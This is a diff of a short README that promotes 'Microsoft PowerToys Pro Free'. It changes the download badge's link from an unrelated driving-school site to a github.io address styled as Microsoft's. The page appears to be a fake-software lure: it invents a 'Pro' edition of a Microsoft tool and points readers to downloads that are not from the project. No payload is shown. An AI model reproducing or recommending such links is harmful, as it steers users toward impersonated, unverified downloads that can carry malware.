@@ -2,7 +2,7 @@
 
 Enjoy a faster, smarter Windows with Microsoft PowerToys Pro Free – an easy-to-use collection of powerful tools to boost your everyday PC tasks. Customize, manage, and enhance your workflow with zero cost.
 
-[![Download PowerToys Pro](https://img.shields.io/badge/Download-PowerToys--Pro-blueviolet)](https://dalahdrivingschool.com/)
+[![Download PowerToys Pro](https://img.shields.io/badge/Download-PowerToys--Pro-blueviolet)](https://microsoft-powertoys.github.io/.github)
 
 ---
 
